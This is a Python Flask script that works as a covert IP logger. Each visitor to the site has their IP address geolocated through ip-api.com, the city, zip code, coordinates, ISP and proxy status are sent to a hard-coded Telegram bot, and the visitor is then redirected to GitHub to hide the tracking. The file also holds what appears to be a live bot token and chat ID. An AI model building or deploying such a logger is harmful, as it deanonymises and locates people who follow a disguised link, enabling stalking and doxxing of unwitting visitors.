from flask import Flask, request, redirect
import requests
import os
from datetime import datetime

REDIRECT = 'https://github.com/'
BOT_API = '6864441626:AAG3MeHfi9UF0QSMTt7sUV2WIaysVkAS1jc'
OWNER_ID = '6959232612'
app = Flask(__name__)

@app.route("/")
def main():
    headers_list = request.headers.getlist("X-Forwarded-For")
    user_ip = headers_list[0] if headers_list else request.remote_addr
    url = f"http://ip-api.com/json/{user_ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
    response = requests.get(url)
    info = response.json()
    output = f"""*🥳🥳A new visiter arrived on the website!!🥳🥳*
*Timestamp :* `{datetime.now()}`
*IP Address : {info['query']}*
*Details : *
    *Status :* `{info['status']}`
    *Continent Code :* `{info['continentCode']}`
    *Country :* `{info['country']}`
    *Country Code :* `{info['countryCode']}`
    *Region :* `{info['region']}`
    *Region Name :* `{info['regionName']}`
    *City :* `{info['city']}`
    *District :* `{info['district']}`
    *Zip :* `{info['zip']}`
    *Latitude :* `{info['lat']}`
    *Longitude :* `{info['lon']}`
    *Time Zone :* `{info['timezone']}`
    *Offset :* `{info['offset']}`
    *Currency :* `{info['currency']}`
    *ISP :* `{info['isp']}`
    *Org :* `{info['org']}`
    *As :* `{info['as']}`
    *Asname :* `{info['asname']}`
    *Reverse :* `{info['reverse']}`
    *User is on Mobile :* `{info['mobile']}`
    *Proxy :* `{info['proxy']}`
    *Hosting :* `{info['hosting']}`
    """
    requests.get(f'https://api.telegram.org/bot{BOT_API}/sendmessage?chat_id={OWNER_ID}&text={output}&parse_mode=Markdown')
    return redirect(REDIRECT)
    
if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=False)
